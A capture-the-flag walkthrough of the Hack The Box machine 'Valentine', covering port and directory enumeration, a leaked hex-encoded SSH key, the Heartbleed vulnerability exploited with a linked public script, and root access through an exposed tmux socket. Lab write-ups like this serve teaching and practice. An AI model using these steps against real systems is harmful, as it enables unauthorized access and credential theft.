![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f3996245-00f0-43b2-abe0-89a507113230)

first enumeartion with nmap

```
# Nmap 7.93 scan initiated Sun Jun  4 04:11:57 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,443 -Pn 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.14s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-06-04T03:12:21+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun  4 04:12:22 2023 -- 1 IP address (1 host up) scanned in 25.08 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5b6c06c6-585a-491c-8dad-701d124ae959)

noticed a web server running, opening on browser, we got a page with a pic of a lady screaming or happy we don't no 🤷‍♂️. let's fuzz

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Valentine]
└─$ gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt 2>/dev/null
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/06/04 04:18:01 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/decode.php           (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 292]

===============================================================
2023/06/04 07:12:13 Finished
===============================================================
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/58f1211f-e463-4161-8bae-5360a6bbc93e)

navigativing to the `/dev` dir, got to see 2 files. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ae171c38-93d2-453b-98a2-1c440fb01065)

checking out the first file, we can see it is an encoding. let's decode this text. looks like an hex encoding.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7b9ff2e1-b05a-4ed3-a0a2-18a76afcb749)

cool we can see it is an `id_rsa` key. let's download the result.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Valentine]
└─$ sslyze --heartbleed 10.10.10.79

 CHECKING CONNECTIVITY TO SERVER(S)
 ----------------------------------

   10.10.10.79:443           => 10.10.10.79 


 SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79
 ----------------------------------------------

 * OpenSSL Heartbleed:
                                          VULNERABLE - Server is vulnerable to Heartbleed

 SCANS COMPLETED IN 1.456028 S
 -----------------------------

 COMPLIANCE AGAINST MOZILLA TLS CONFIGURATION
 --------------------------------------------

    Disabled; use --mozilla_config={old, intermediate, modern}.
```
next scan the IP for heartbleed vuln and bull's eye the site is vuln to heart bleed. let's exploit this vuln

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0ad28923-6c7b-4947-84fe-3ecad8bd3f9a)

found an exploit on github... [exploit](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e16c5753-3e03-40f9-ab21-ecb332804daa)

ran the exploit, got to see a text `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`, looks like a base64 encoding. decoded to `heartbleedbelievethehype`. which looks lik a potential password. let's try login ssh using what we have. `hype`, `id_rsa`,`heartbleedbelievethehype`.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Valentine]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@valentine.htb 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~$ 
```
bingo we are in. let's escalate privs 


## Privilege Escalation 

```
hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
hype@Valentine:~$ tmux -S /.devs/dev_sess
```
playing around, read the `.bash_history` file. and we can see a tmux session `/.devs/dev_sess`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/be14e0d4-c620-4612-92cf-b18a0fa60967)

opening the tmux session, got us into a root shell. and we are through 😜 had fun yeah?

